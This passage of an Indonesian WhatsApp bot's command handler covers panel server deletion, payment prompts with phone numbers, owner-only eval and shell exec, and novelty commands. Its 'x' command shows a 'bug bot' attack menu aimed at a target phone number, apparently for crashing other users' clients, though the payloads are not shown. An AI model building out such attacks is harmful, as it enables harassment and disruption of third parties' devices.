"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return Reply("Server panel tidak ditemukan!")
Reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//nope
case "payment":
case "pay":
case "qr":
case "qris": {

const fs = require("fs")

let teks = `💸 *SILAHKAN PILIH METODE PAYMENT*

Silahkan pilih metode pembayaran 👇

• Transfer ke salah satu Nope
• Klik tombol untuk menyalin Nope

📸 *Kirim Bukti Pembayaran*
Kirim screenshot / foto transfer ke owner
agar pesanan diproses ⚡`

let buffer = fs.readFileSync("./qris.jpg")
let audio = fs.readFileSync("./media/menu3.mp3")

// 🔥 bikin message dulu
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {

contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: "𝐊𝐄𝐋𝐏𝐎𝐍 𝐏𝐀𝐘𝐌𝐄𝐍𝐓",
newsletterJid: "120363426723637081@newsletter"
}
},

header: {
hasMediaAttachment: true,
imageMessage: (await prepareWAMessageMedia(
{ image: buffer },
{ upload: conn.waUploadToServer }
)).imageMessage
},

body: { text: teks },

footer: { text: "PAYMENT • KELPIN GV" },

nativeFlowMessage: {
buttons: [

{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "089663152244",
copy_code: String(global.dana || "Tersedia")
})
},

{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "085890160393",
copy_code: String(global.gopay || "Tersedia")
})
}

]
}

}
}
}
}, { quoted: qtoko }) // 🔥 ini sekarang WORK

// kirim
await conn.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})

// delay
await new Promise(r => setTimeout(r, 800))

// audio juga quoted
await conn.sendMessage(m.chat, {
audio: audio,
mimetype: "audio/mpeg",
ptt: true
}, { quoted: qtoko })

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "owner": case "sutt": {
await conn.sendContact(m.chat, [global.owner], seto)
}
break

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION ${global.botname}*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await Reply(respon)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "public": {
if (!isCreator) return
conn.public = true
Reply("Berhasil mengganti ke mode *public*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await Reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
conn.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listowner": case "listown": {
if (owners.length < 1) return Reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return Reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return Reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return Reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
Reply(`Berhasil menghapus owner ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return Reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return Reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
Reply(`Berhasil menambah owner ✅`)
}


case "swgrup2": {
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || "";
    const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
    const jid = m.chat;
    
    if (/image/.test(mime)) {
        const buffer = await quoted.download();
        await conn.sendMessage(m.chat, {
            groupStatusMessage: {
                image: buffer,
                caption
            }
        });
        m.react("✅️")
    } else if (/video/.test(mime)) {
        const buffer = await quoted.download();
        await conn.sendMessage(m.chat, {
            groupStatusMessage: {
                video: buffer,
                caption
            }
        });
        m.react("✅️")
    } else if (/audio/.test(mime)) {
        const buffer = await quoted.download();
        await conn.sendMessage(m.chat, {
            groupStatusMessage: {
                audio: buffer
            }
        });
        m.react("✅️")
    } else if (caption) {
        await conn.sendMessage(m.chat, {
            groupStatusMessage: {
                text: caption
            }
        });
        m.react("✅️")
    } else {
        await Reply(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai ini saya`);
    }
}
break
case "cekjawa": {
    if (!text) return Reply("Contoh penggunaan: .cekjawa kelpin");

    let jawaban = [
        "🔥 Wah, *100% Jawa tulen* bro 😎, ngoko-ngokone kenceng!",
        "50% Jawa, 50% doyan nge-jomblo 😹🗿",
        "90% Jawa tapi kadang sok kromo, sok pamer wkwk 🤭",
        "70% Jawa, 30% hatinya lagi nyasar di warung kopi ☕",
        "100% Jawa, tapi kadang suka muter sinetron sambil ngopi 😂",
        "85% Jawa, 15% doyan nge-prank temen 😎🗿",
        "95% Jawa, tapi kadang kebawa drama receh 😹",
        "80% Jawa, tapi kadang ngambek tanpa sebab 😤",
        "100% Jawa, tapi kadang kebawa gaya ala TikTok 🕺",
        "60% Jawa, 40% suka nge-galau malam 🌙",
        "75% Jawa, tapi hatinya lembut kaya tahu 🤭",
        "90% Jawa, tapi kadang sok tegas wkwk 😏",
        "50% Jawa, 50% receh & lucu parah 😹🗿",
        "100% Jawa, tapi suka telat bangun tidur 😴",
        "85% Jawa, 15% doyan dangdut remix 🎶",
        "95% Jawa, tapi kadang kebawa drama WhatsApp 😅",
        "70% Jawa, 30% suka ngemil keripik 😋",
        "80% Jawa, tapi hatinya bener-bener Jawa asli ❤️",
        "100% Jawa, tapi kadang keras kepala parah 😎🗿",
        "65% Jawa, 35% suka ngopi sambil scroll TikTok ☕📱"
    ];

    let randomIndex = Math.floor(Math.random() * jawaban.length);
    let result = jawaban[randomIndex];

    Reply(`Hasil *cekJawa* untuk *${text}*:\n${result}`);
}
break
case "panduan": {
const fs = require("fs")

// kirim panduan + gambar
await conn.sendMessage(m.chat, {
document: fs.readFileSync("./media/text.txt"),
fileName: "Panduan Script MutanoX-BotMDl.txt",
mimetype: "text/plain",
caption: "📖 *Panduan Script MutanoX-BotMD*\n\nSilakan baca panduan untuk mengetahui info.",
contextInfo: {
externalAdReply: {
title: "Panduan Script MutanoX-BotMD",
body: "Panduan penggunaan script",
thumbnailUrl: "https://img2.pixhost.to/images/7475/719279858_papaqueen.jpg",
sourceUrl: "https://files.catbox.moe/h5yzws.mpeg",
mediaType: 1,
renderLargerThumbnail: true
}
}
}, { quoted: qtoko })

// kirim lagu di bawah
await conn.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/panduan.mp3'),
    mimetype: 'audio/mp4',
    ptt: true
  }, { quoted: m })
}
break
case "fakta": {
try {

const axios = require("axios")
let res = await axios.get("https://uselessfacts.jsph.pl/api/v2/facts/random")

await conn.sendMessage(m.chat, {
text: `📚 *Random Fact*\n\n${res.data.text}`
}, { quoted: m })

} catch (e) {
console.log(e)
Reply("❌ gagal mengambil fakta")
}

}
break
case "tiktokslide":
case "ttslide": {
try {

if (!text) return Reply("contoh: .ttslide https://vt.tiktok.com/xxxxx")

Reply("⏳ Tunggu sebentar, sedang mengambil slide TikTok...")

const axios = require("axios")

let res = await axios.post("https://tikwm.com/api/", {
url: text
})

let data = res.data.data

if (!data.images || data.images.length === 0) {
return Reply("❌ Video ini bukan TikTok slide")
}

const cards = await Promise.all(data.images.map(async (img, i) => ({
header: {
title: `TikTok Slide #${i+1}`,
hasMediaAttachment: true,
imageMessage: (await generateWAMessageContent({
image: { url: img }
},{
upload: conn.waUploadToServer
})).imageMessage
},
body: {
text: data.title || "TikTok Slide"
},
footer: {
text: data.author.nickname
},
nativeFlowMessage: {
buttons: [
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Buka TikTok",
url: text
})
}
]
}
})))

const msg = generateWAMessageFromContent(m.chat,{
viewOnceMessage:{
message:{
interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body:{ text:"📸 TikTok Slide Downloader" },
footer:{ text:"Kelpin Gv" },
carouselMessage:{ cards }
})
}
}
},{ quoted:m })

await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

// kirim audio tiktok
await conn.sendMessage(m.chat,{
audio:{ url: data.music },
mimetype:"audio/mpeg",
ptt:false
},{ quoted:m })

} catch (err) {

console.log("❌ ERROR TTSLIDE:", err)
Reply("❌ gagal mengambil slide TikTok")

}

}
break


case "setppgc": {
if (!m.isGroup) return Reply("khusus grup")
if (!m.quoted) return Reply("reply foto")

let media = await m.quoted.download()

await conn.updateProfilePicture(m.chat, media)

Reply("✅ Foto grup berhasil diganti")

}
break
case "x": {
        if (!q) return KataAudio(`Example: ${prefix}x 628824566324`);
    
    // Ambil nomor target langsung dari argumen
    let target = q.replace(/[^0-9]/g, "")
    try {
        const thumbImage = fs.existsSync("./media/lol.jpg") ? fs.readFileSync("./media/lol.jpg") : null;

        await conn.sendMessage(m.chat, {
            image: { url: "https://img2.pixhost.to/images/6673/707739758_settomodders.jpg" },
            caption: `Witajcie u mnie, jestem botem WhatsApp typu bug stworzonym przez oficjalnego kelpin, który jest gotowy Ci pomóc

 \`S E L E C T I O N S\`
 — EXCECUTOR ${target}
 — Nama Bot : MutanoX-BotMD
 — Developer : Kelpin Gv
 — Action : w.co/['$kelpinnx'];
 — Language : JavaScript
 — OnThe Menu : Sellections`,
            footer: "THE EXCECUTOR ATTACK",
            buttons: [
                { buttonId: `${prefix}con1 ${target}`, buttonText: { displayText: "-EX 1" }, type: 1 },
                { buttonId: `${prefix}con2 ${target}`, buttonText: { displayText: "-EX 2" }, type: 1 },
                { buttonId: `${prefix}con3 ${target}`, buttonText: { displayText: "-EX 3" }, type: 1 },
                { buttonId: `${prefix}con4 ${target}`, buttonText: { displayText: "-EX 4" }, type: 1 }
            ],
            contextInfo: {
                mentionedJid: [m.chat],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "𝐊𝐄𝐋𝐄𝐏𝐎𝐍",
                    newsletterJid: "120363426723637081@newsletter",
                    serverMessageId: 1
                }
            },
            headerType: 4
        }, { quoted: qtoko });
await conn.sendMessage(m.chat, {
            audio: { url: "https://cdn.nekohime.site/file/8dRXLM4K.mp3" },
            mimetype: "audio/mpeg", // pastikan sesuai file
            ptt: true
        }, { quoted: m }); // pakai m atau bisa undefined kalau mau
    } catch (e) {
        console.error("Error kirim menu/audio:", e);
    }
}
break;


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await Reply(evaled)
} catch (err) {
await Reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text.toLowerCase() == "bot") {
Reply("Kelpin Md Online✅")
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await Reply(evaled)
} catch (err) {
await Reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return Reply(`${err}`)
if (stdout) return Reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}
} catch (err) {
console.log(util.format(err));
let Obj = global.owner
conn.sendMessage(Obj + "@s.whatsapp.net", {text: `*Hallo developer, telah terjadi error pada command :* ${isCmd ? prefix+command : m.text}

*Detail informasi error :*
${util.format(err)}`, contextInfo: { isForwarded: true }}, {quoted: m})
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});
